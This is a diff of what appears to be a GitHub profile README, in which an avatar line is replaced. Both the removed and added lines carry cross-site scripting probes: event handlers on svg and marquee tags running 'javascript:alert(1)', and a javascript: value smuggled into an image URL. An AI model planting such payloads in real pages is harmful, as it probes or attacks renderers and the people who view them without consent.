@@ -5,4 +5,4 @@
 - 📫 How to reach me ...
 
 ![text](https://avatars.githubusercontent.com/u/92805783?s=40&v=4)
-![<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize><img src="https://avatars.githubusercontent.com/u/92805783?&s=40&v=javascript:alert(1)" title="okggle" />](()
+![<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>||<img src="https://avatars.githubusercontent.com/u/92805783?&s=40&v=javascript:alert(1)" title="okggle" />](()
